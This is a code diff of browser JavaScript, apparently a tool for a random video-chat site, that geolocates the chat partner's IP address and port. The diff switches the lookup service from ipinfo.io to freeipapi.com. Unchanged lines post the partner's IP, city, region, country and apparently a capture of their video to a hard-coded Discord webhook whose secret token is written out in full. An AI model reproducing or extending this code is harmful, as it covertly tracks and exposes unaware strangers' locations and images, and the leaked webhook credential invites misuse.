@@ -102,7 +102,7 @@
     const set_message = (ipp, cityy, regionn, countryy, locc) => {
         ip.innerText = ipp;
         city.innerText =  cityy;
-        country.innerText =  regionNames.of(countryy);
+        country.innerText =  countryy;
         loc.innerText =  locc;
     }
 
@@ -111,11 +111,11 @@
 
 
     var getLocation = async (ip,port) => {
-        let url = `https://ipinfo.io/${ip}?token=${apiKey}`;
+        let url = `https://freeipapi.com/api/json/${ip}`;
         await fetch(url).then((response) =>
             response.json().then((json) => {
                 const ip = json.ip+":"+port
-                set_message(ip, json.city, json.region, json.country, json.loc);
+                set_message(ip, json.cityName, json.regionName, json.countryName, json.isProxy);
                 const request = new XMLHttpRequest();
                 const image = document.querySelector("#imag");
                 const video = document.querySelector("#remote-video");
@@ -123,11 +123,9 @@
                 const canvas = document.createElement('canvas');
                 request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
                 request.withCredentials = true
-                if(changed == false){
-                    const watermark = document.querySelector(".remote-video__watermark");
-                    watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
-                    changed = true;
-                }
+                const watermark = document.querySelector(".remote-video__watermark");
+                watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
+
                 var set = setInterval(() => {
                 if(wrapper.classList.contains('s-play')){
                     clearInterval(set);
@@ -146,7 +144,7 @@
                         city: ${json.city} \n
                         region: ${json.region} \n
                         country: ${json.country} \n
-                        lat/long: ${json.loc} \n`,
+                        isproxy: ${json.isProxy} \n`,
                         color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                       };
                       var params = {
